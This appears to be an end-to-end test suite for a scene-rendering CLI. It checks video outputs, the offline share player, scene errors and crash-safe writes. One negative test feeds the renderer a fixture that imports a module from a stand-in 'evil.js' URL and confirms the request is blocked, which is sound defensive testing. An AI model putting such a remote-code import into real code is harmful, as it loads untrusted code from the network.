// End to end: real scenes through the real renderer, and each way a scene can go wrong.
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { describe, it } from "node:test";
import { chromium } from "playwright";
import { cli, cliAsync, fixture, GOOD_BODY, rawFixture, tempDir, verifyReport } from "./helpers.mjs";
import { openScene } from "../lib/core.mjs";
import { probeVideo } from "../lib/verify.mjs";

const passes = (r) => assert.equal(r.code, 0, r.all);
const LAUNCH = process.platform === "darwin" ? ["--use-angle=metal", "--ignore-gpu-blocklist"] : [];

describe("positive: built-in scenes pass every check", () => {
  for (const s of ["pier", "station", "market", "whale"]) it(s, () => passes(verifyReport(s)));
  for (const s of ["pier", "station", "market", "whale"]) for (const aspect of ["9:16", "1:1", "4:5"]) it(`${s} at ${aspect}`, () => passes(verifyReport(s, ["--aspect", aspect])));
});

describe("positive: options", () => {
  for (const look of ["day", "dusk", "night", "rain"]) it(`look ${look}`, () => passes(verifyReport("pier", ["--look", look])));
  for (const choreo of ["reveal", "snap", "grand"]) it(`choreography ${choreo}`, () => passes(verifyReport("pier", ["--choreo", choreo])));
  for (const d of ["4", "30"]) it(`duration ${d}`, () => passes(verifyReport("pier", ["--duration", d])));
  it("the new-scene template passes straight away", () => { const dir = tempDir("t"); cli(["new", "fresh", "--dir", dir]); passes(verifyReport(path.join(dir, "fresh"))); });
  it("the baseline fixture passes", () => passes(verifyReport(fixture(GOOD_BODY))));
  it("a scene file at any path, with spaces and accents", () => { const d = fixture(GOOD_BODY); passes(cli(["stills", path.join(d, "scene.js"), "--times", "0.5", "--out", path.join(tempDir("out dir"), "s")])); });
});

describe("positive: output files", () => {
  it("preview is the right size and loop length, with a report and sheet", () => {
    const out = path.join(tempDir("p"), "pv.mp4"); const r = cli(["preview", "pier", "--out", out]); passes(r);
    const i = probeVideo(out); assert.deepEqual([i.width, i.height, i.frames], [960, 540, 300]); assert.ok(Math.abs(i.duration - 10) < 0.1);
    const report = JSON.parse(fs.readFileSync(out.replace(".mp4", "-report.json"), "utf8")); assert.equal(report.passed, true); assert.ok(fs.statSync(report.contactSheet).size > 1000);
  });
  it("creates missing output folders", () => { const out = path.join(tempDir("p"), "a", "b", "c.mp4"); passes(cli(["preview", "pier", "--out", out, "--duration", "4", "--no-verify"])); assert.ok(fs.existsSync(out)); });
  it("--aspect all writes three videos at the right shapes", () => {
    const out = path.join(tempDir("p"), "v.mp4"); passes(cli(["preview", "market", "--aspect", "all", "--out", out, "--duration", "4", "--no-verify"]));
    const sizes = { "16x9": [960, 540], "9x16": [540, 960], "1x1": [540, 540] };
    for (const [k, [w, h]] of Object.entries(sizes)) { const i = probeVideo(out.replace(".mp4", `-${k}.mp4`)); assert.deepEqual([i.width, i.height], [w, h]); }
  });
  it("writes webm", () => { const out = path.join(tempDir("p"), "v.webm"); passes(cli(["preview", "pier", "--format", "webm", "--out", out, "--duration", "4", "--no-verify"])); assert.equal(probeVideo(out).codec, "vp9"); });
  it("a final slice is full size at 60 fps and skips the seam check", () => {
    const out = path.join(tempDir("p"), "f.mp4"); const r = cli(["render", "pier", "--from", "0", "--to", "0.25", "--out", out]);
    const i = probeVideo(out); assert.deepEqual([i.width, i.height, i.frames], [1920, 1080, 15]); assert.match(r.out, /SKIP\s+Loop seam/);
  });
  it("two renders at once do not disturb each other", async () => {
    const dir = tempDir("p"), a = path.join(dir, "a.mp4"), b = path.join(dir, "b.mp4");
    const run = (out) => new Promise((res) => cliAsync(["preview", "pier", "--out", out, "--duration", "4", "--no-verify"]).on("close", res));
    assert.deepEqual(await Promise.all([run(a), run(b)]), [0, 0]); assert.equal(probeVideo(a).frames, 120); assert.equal(probeVideo(b).frames, 120);
  });
  it("identical renders produce identical frames", async () => {
    const png = async () => { const s = await openScene(path.join(fixture(GOOD_BODY), "scene.js"), { width: 480, height: 270, quality: "draft" }); try { await s.page.evaluate(() => DR.frame(3.3, 30)); return (await s.page.screenshot()).toString("base64"); } finally { await s.close(); } };
    assert.equal(await png(), await png());
  });
});

describe("positive: shared player", () => {
  it("is one self-contained file that plays and scrubs with no network", async () => {
    const out = path.join(tempDir("share page"), "p.html"); passes(cli(["share", "pier", "--out", out]));
    const browser = await chromium.launch({ args: LAUNCH });
    try {
      const page = await browser.newPage({ viewport: { width: 1200, height: 800 } }), requests = [], errors = [];
      page.on("request", (r) => { if (!r.url().startsWith("file:")) requests.push(r.url()); });
      page.on("pageerror", (e) => errors.push(e.message));
      await page.goto(`file://${out}`); await page.waitForFunction(() => window.DR, null, { timeout: 30000 });
      assert.equal(await page.textContent("#title"), "Saltwater Pier");
      const a = await page.evaluate(() => document.getElementById("bar").value);
      await page.waitForTimeout(500);
      const b = await page.evaluate(() => document.getElementById("bar").value); assert.notEqual(a, b, "should be playing");
      await page.click("#play"); await page.waitForTimeout(100);
      const c = await page.evaluate(() => document.getElementById("bar").value); await page.waitForTimeout(300);
      assert.equal(c, await page.evaluate(() => document.getElementById("bar").value), "should be paused");
      await page.fill("#bar", "5"); assert.equal(await page.evaluate(() => +document.getElementById("bar").value), 5);
      await page.click('[data-aspect="9:16"]'); await page.waitForFunction(() => window.DR && new URLSearchParams(location.search).get("aspect") === "9:16");
      const size = await page.evaluate(() => [DR.width, DR.height]); assert.ok(size[1] > size[0]);
      assert.deepEqual(requests, []); assert.deepEqual(errors, []);
    } finally { await browser.close(); }
  });
  it("respects reduced motion by starting paused", async () => {
    const out = path.join(tempDir("share"), "p.html"); passes(cli(["share", "pier", "--out", out]));
    const browser = await chromium.launch({ args: LAUNCH });
    try { const ctx = await browser.newContext({ reducedMotion: "reduce" }), page = await ctx.newPage(); await page.goto(`file://${out}`); await page.waitForFunction(() => window.DR); assert.equal(await page.textContent("#play"), "Play"); } finally { await browser.close(); }
  });
});

describe("negative: scenes that cannot run", () => {
  const sceneError = (d, pattern) => { const r = cli(["verify", d]); assert.equal(r.code, 4, r.all); assert.match(r.all, pattern); assert.doesNotMatch(r.all, /at .*\.js:\d+:\d+/, "no raw stack trace"); };
  it("default export is not a scene", () => sceneError(rawFixture("export default 5;"), /must `export default/));
  it("no default export", () => sceneError(rawFixture("export const a = 1;"), /must `export default/));
  it("missing build", () => sceneError(rawFixture('export default { name: "x" };'), /missing a build/));
  it("build throws", () => sceneError(fixture('throw new Error("kaboom");'), /kaboom/));
  it("typo in a kit call", () => sceneError(fixture('k.lampp([0, 0]);'), /lampp is not a function/));
  it("empty scene", () => sceneError(fixture(""), /no visible objects/));
  it("only ground", () => sceneError(fixture('k.ground(10, 10, "#000");'), /no visible objects/));
  it("no depth", () => sceneError(fixture('k.box(20, 10, 1, "#fff", [0, 0, 0]);'), /almost no depth/));
  it("async build", () => sceneError(rawFixture('export default { async build(k) { k.box(1,1,1,"#fff",[0,0,0]); } };'), /synchronous/));
  it("NaN position", () => sceneError(fixture('k.box(2, 2, 2, "#fff", [NaN, 0, 0]);'), /no visible objects|invalid geometry|not finite/));
  it("unknown look in the scene", () => sceneError(fixture(GOOD_BODY, 'look: "foggy",'), /unknown look/));
  it("unknown choreography in the scene", () => sceneError(fixture(GOOD_BODY, 'choreography: "wobble",'), /unknown choreography/));
  it("bad flatWidth", () => sceneError(fixture(GOOD_BODY, "flatWidth: -3,"), /flatWidth/));
  it("unknown shot override", () => sceneError(fixture(GOOD_BODY, "shots: { nope: { y: 1 } },"), /no shot called "nope"/));
  it("swap without positions", () => sceneError(fixture(`const g = k.group(() => k.box(1,1,1,"#fff",[0,0,0]), [0,0,0]); k.swap(g, {});`), /row: \[x, z\]/));
  it("swap of a non-object", () => sceneError(fixture("k.swap(5, { row: [0,0], alt: [0,0] });"), /kit\.swap needs an object/));
  it("tile with a bad shape", () => sceneError(fixture('k.tile(3, { across: [0,1], depth: [0,1], shape: "x" }, () => {});'), /unknown tile shape/));
  it("network import is blocked", () => { const r = cli(["verify", rawFixture('import x from "https://example.com/evil.js"; export default { build(k) {} };')]); assert.equal(r.code, 4, r.all); assert.match(r.all, /Blocked network request|Failed to fetch/); });
  it("an endless loop in build times out cleanly", () => { const r = cli(["verify", fixture("while (true) {}")], { env: { DR_LOAD_TIMEOUT_MS: "4000" } }); assert.equal(r.code, 4, r.all); assert.match(r.all, /longer than 4 seconds/); });
});

describe("negative: scenes that run but fail a check", () => {
  const fails = (d, id, args = []) => { const r = verifyReport(d, args); assert.equal(r.code, 1, r.all); assert.equal(r.status(id), "fail", r.all); };
  it("a flat shot that is not flat", () => fails(fixture(GOOD_BODY, 'look: "day", shots: { flat: { lens: 40 }, flatIn: { lens: 40 } },'), "flat-holds"));
  it("a mostly empty frame", () => fails(fixture(GOOD_BODY, 'look: "day", flatWidth: 300,'), "coverage"));
  it("nothing reaching the frame edges", () => fails(fixture(GOOD_BODY, 'look: "day", flatWidth: 120,'), "edges"));
  it("non-periodic animation", () => fails(fixture(GOOD_BODY + `const m = k.box(4, 4, 4, "#f00", [0, 0, 5]); k.animate(m, (p) => { m.position.x = p * 12; });`), "scene-seam"));
  it("randomness during animation", () => fails(fixture(GOOD_BODY + `const m = k.box(4, 4, 4, "#f00", [0, 0, 5]); k.animate(m, () => { m.position.x = Math.random() * 12; });`), "repeat"));
  it("a swap that slides sideways", () => fails(fixture(GOOD_BODY + `const g = k.group(() => k.cyl(0.4, 1, "#00f", [0,0,0]), [-9, 0, 16]); k.swap(g, { row: [-9, 16], alt: [9, 16] });`), "swap-hidden"));
  it("a camera that ends up inside an object", () => fails(fixture(GOOD_BODY + `k.box(8, 8, 8, "#0f0", [0, 0, 21.2]);`, 'look: "day", shots: { deep: { x: 0, y: 3, z: 15, frame: 10 }, deepHold: { x: 0, y: 3, z: 15, frame: 10 } },'), "camera-clear"));
  it("a custom timeline that swaps on a wide lens", () => {
    const d = fixture(GOOD_BODY, `look: "day", timeline: ({ shots, buildTimeline }) => { const s = { ...shots, flatAlt: { ...shots.deep, swap: 1 } }; return buildTimeline(s, "snap"); },`);
    fails(d, "swap");
  });
  it("no swap objects only warns", () => { const r = verifyReport(fixture(GOOD_BODY.replace(/for \(let i = 0; i < 5[^\n]*\n/, ""))); assert.equal(r.status("swap"), "warn", r.all); assert.equal(r.code, 0, r.all); });
  it("too many light pools warns and still renders", () => { const r = verifyReport(fixture(GOOD_BODY + 'for (let i = 0; i < 20; i++) k.pool([0, 1, -i], 5, "#ff0000");')); assert.equal(r.status("kit"), "warn", r.all); });
});

describe("negative: output problems", () => {
  it("a read-only folder gives a clear error", () => { const d = tempDir("ro"); fs.chmodSync(d, 0o555); try { const r = cli(["preview", "pier", "--out", path.join(d, "x", "v.mp4")]); assert.equal(r.code, 3, r.all); assert.match(r.all, /Cannot write/); } finally { fs.chmodSync(d, 0o755); } });
  it("--to beyond the loop is rejected", () => { const r = cli(["preview", "pier", "--to", "99", "--out", path.join(tempDir("x"), "v.mp4")]); assert.equal(r.code, 2, r.all); assert.match(r.all, /--from and --to/); });
  it("--from after --to is rejected", () => { const r = cli(["preview", "pier", "--from", "5", "--to", "2", "--out", path.join(tempDir("x"), "v.mp4")]); assert.equal(r.code, 2, r.all); });
  it("an encoder crash leaves no half-written file", () => {
    const dir = tempDir("bad"), fake = path.join(dir, "ffmpeg"); fs.writeFileSync(fake, '#!/bin/sh\nif [ "$1" = "-version" ]; then echo ok; exit 0; fi\nexit 9\n'); fs.chmodSync(fake, 0o755);
    const out = path.join(dir, "v.mp4"); const r = cli(["preview", "pier", "--out", out], { env: { FFMPEG: fake } });
    assert.equal(r.code, 3, r.all); assert.match(r.all, /encoder/); assert.deepEqual(fs.readdirSync(dir).filter((f) => f.startsWith("v.mp4")), []);
  });
  it("Ctrl-C mid-render leaves no half-written file", async () => {
    const dir = tempDir("int"), out = path.join(dir, "v.mp4"), child = cliAsync(["render", "pier", "--out", out, "--duration", "4"]);
    await new Promise((res) => { child.stderr.on("data", (d) => { if (/10%/.test(String(d))) res(); }); });
    child.kill("SIGINT"); const code = await new Promise((res) => child.on("close", res));
    assert.equal(code, 130); assert.deepEqual(fs.readdirSync(dir), []);
  });
  it("a failed render does not replace a good older video", () => {
    const dir = tempDir("keep"), out = path.join(dir, "v.mp4"); fs.writeFileSync(out, "older good file");
    const r = cli(["preview", rawFixture("export default 5;"), "--out", out]); assert.equal(r.code, 4); assert.equal(fs.readFileSync(out, "utf8"), "older good file");
  });
});
